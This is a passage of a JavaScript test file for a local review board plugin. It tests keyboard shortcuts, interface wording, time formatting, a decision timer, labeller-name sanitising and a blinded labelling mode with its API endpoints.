    [{ key: '0', code: 'Digit0' }, '0'], [{ key: '&', code: 'Digit1' }, '1'], [{ key: '[', code: 'BracketLeft' }, '['], [{ key: 'ArrowDown', code: 'ArrowDown' }, 'ArrowDown'],
    [{ key: ' ', code: 'Space' }, ' '], [{ key: 'Escape', code: 'Escape' }, 'Escape'], [{ key: 'j' }, 'j'],
  ];
  for (const [e, k] of cases) assert.equal(keyOf(e), k, JSON.stringify(e));
  assert.deepEqual(DECISION_KEYS[keyOf({ key: 'ㄹ', code: 'KeyF' })], { decision: 'fix', reason: null }, 'F on a Korean layout fixes');
  assert.deepEqual(DECISION_KEYS[keyOf({ key: 'W', code: 'KeyW', shiftKey: false })], { decision: 'keep', reason: 'intended' }, 'Caps Lock W keeps as intended, not out of scope');
});

test('words: the tree-differs banner says one thing (no "Re-check" beside "capture again"); the plugin says the board is here', () => {
  assert.equal(WORDS['tree-differs'], 'Screens are from before your latest edits: tell your AI “capture again”');
  const js = readFileSync(fileURLToPath(new URL('../src/board/assets/board.js', import.meta.url)), 'utf8');
  assert.match(js, /W\.WORDS\['tree-differs'\]\)/, 'shown as it is, nothing appended');
  for (const f of ['plugin.json', 'marketplace.json']) {
    const text = readFileSync(fileURLToPath(new URL(`../.claude-plugin/${f}`, import.meta.url)), 'utf8');
    assert.doesNotMatch(text, /progress board are coming|board (is|are) coming/i, f);
    assert.match(text, /live local board/, f);
  }
});

test('words: a decision\'s time reads in whole minutes and hours, rounded down (59.5 minutes is "59 min ago", never "60 min ago")', () => {
  const now = Date.parse('2026-10-15T03:00:00+09:00');
  const ago = s => new Date(now - s * 1000).toISOString();
  for (const [s, text] of [[0, 'just now'], [59, 'just now'], [-30, 'just now'], [60, '1 min ago'], [119, '1 min ago'], [59.5 * 60, '59 min ago'], [3599, '59 min ago'], [3600, '1 h ago'],
    [2.5 * 3600, '2 h ago'], [86399, '23 h ago'], [86400, null], [-120, null]]) assert.equal(relativeTime(ago(s), now), text, `${s} s`);
  assert.equal(relativeTime('not a time', now), null);
  const js = readFileSync(fileURLToPath(new URL('../src/board/assets/board.js', import.meta.url)), 'utf8');
  assert.match(js, /W\.relativeTime\(at, Date\.now\(\)\)/, 'the page uses it');
});

test('decision clock (§3.5): paused while the tab is hidden and after 30 s without input; capped at 120 s', () => {
  const c = new DecisionClock();
  c.reset('g', 0);
  assert.equal(c.read(5000), 5000);
  c.hide(6000); c.show(60000);
  assert.equal(c.read(61000), 7000, 'hidden time does not count');
  c.reset('h', 0);
  assert.equal(c.read(IDLE_MS + 50000), IDLE_MS, 'no input for 30 s: the clock stops at 30 s');
  c.input(100000);
  assert.equal(c.read(101000), IDLE_MS + 1000, 'input starts it again');
  c.reset('i', 0);
  for (let t = 0; t <= 200000; t += 10000) c.input(t);
  assert.equal(c.read(200000), CAP_MS, 'capped at 120 s');
});

test('label mode: a labeller name for anyone — accents dropped, any script kept, a name with no letter (or a Windows device name) hashed, the same every time', () => {
  const cases = [['José Núñez', 'jose-nunez'], ['김철수', '김철수'], ['Ἀλέξανδρος', 'αλεξανδροσ'.replace(/σ$/, 'ς')], ['Zoë O\'Brien', 'zoe-o-brien'], ['  Ann  ', 'ann'], ['ＡＢＣ１２', 'abc12'], ['', 'me']];
  for (const [name, slug] of cases) {
    assert.equal(slugLabeller(name), slug, name);
    assert.ok(LABELLER.test(slug), `${slug} is a labeller name`);
  }
  for (const name of ['🙂', '***', 'CON', 'nul', 'Lpt1']) {
    const s = slugLabeller(name);
    assert.match(s, /^u-[0-9a-f]{6}$/, name);
    assert.equal(slugLabeller(name), s, 'the same every time');
  }
  assert.notEqual(slugLabeller('🙂'), slugLabeller('🙃'), 'two such people do not share a folder');
  assert.notEqual(slugLabeller('김철수'), slugLabeller('이영희'), 'two Korean names are two labellers (they were both "me")');
  assert.equal([...slugLabeller('가'.repeat(60))].length, 40, 'at most 40 characters');
  for (const bad of ['../x', 'a/b', 'A', '-a', 'a b', 'x'.repeat(41)]) assert.ok(!LABELLER.test(bad), bad);
});

test('label mode (§9.2): blinded items from the AI pool, its own keys, labels per labeller, no decisions', async () => {
  const p = aiProject();
  const { b, call, session } = await board(p, { mode: 'label', labeller: 'second-labeller' });
  try {
    assert.deepEqual([session.mode, session.labeller], ['label', 'second-labeller']);
    for (const path of ['/api/summary', '/api/groups', '/api/screens']) assert.equal((await call(path)).status, 404, path);
    assert.equal((await call('/api/decide', { targets: [gid(p, 'dead-href')], decision: 'fix', reason: null })).status, 404);
    const pool = (await call('/api/label/pool')).json;
    assert.equal(pool.total, 2, 'the AI groups only, never rule findings');
    assert.deepEqual(pool.items.map(i => i.label), [null, null]);
    const item = (await call(`/api/label/item/${pool.items[0].id}`)).json;
    for (const hidden of ['source', 'verification', 'severity', 'status', 'statuses', 'decision', 'checked', 'suspect', 'kindTitle', 'history']) assert.ok(!(hidden in item), `${hidden} is hidden`);
    assert.ok(!JSON.stringify(item).match(/confirmed|claimed|same-model|"high"|"medium"/), 'nothing says how it was verified or how severe it was called');
    assert.ok(item.lens.definition && item.claim);
    assert.ok(item.question, 'the checklist question');
    assert.equal((await call('/api/label', { id: item.id, label: 'maybe' })).status, 400);
    assert.equal((await call('/api/label', { id: '000000000000', label: 'correct' })).status, 404);
    assert.equal((await call('/api/label', { id: item.id, label: 'correct' })).status, 200);
    const file = join(p.nunchi, 'labels', 'second-labeller', `${item.id}.json`);
    const rec = JSON.parse(readFileSync(file, 'utf8'));
    assert.deepEqual([rec.label, rec.labeller, rec.channel], ['correct', 'second-labeller', 'board']);
    assert.equal((await call('/api/label/pool')).json.done, 1);
    assert.ok(readFileSync(join(p.nunchi, 'state', 'labels-approved.json'), 'utf8').includes(`second-labeller/${item.id}:`));
  } finally { await b.close(); }
  // another labeller sees another order (shuffled per labeller, so position says nothing), and none of the first one's labels
  const other = await board(p, { mode: 'label', labeller: 'owner' });
  try {
    const pool = (await other.call('/api/label/pool')).json;
    assert.equal(pool.done, 0);
  } finally { await other.b.close(); }
  await assert.rejects(startBoard({ projectDir: p.root, mode: 'label', labeller: 'Not Valid' }), /labeller/);
});

test('who decides: git\'s user.name of the project, also for a server whose working folder is the temp folder', async () => {
  const p = smallProject();
  const git = (...a) => new Promise((res, rej) => execFile('git', a, { cwd: p.root }, e => (e ? rej(e) : res())));
  await git('init', '-q');
  await git('config', 'user.name', 'Project Person');
  assert.equal(P.whoAmI(p.root), 'Project Person', 'the project\'s own config');
  const { b, call } = await board(p);
  try {
    const r = await call('/api/decide', { targets: [gid(p, 'dead-href')], decision: 'hold', reason: null });
    assert.equal(r.status, 200);
    assert.equal(decisions(p.nunchi)[0].by, 'Project Person', 'the board records the project\'s user, wherever it runs');
  } finally { await b.close(); }
});
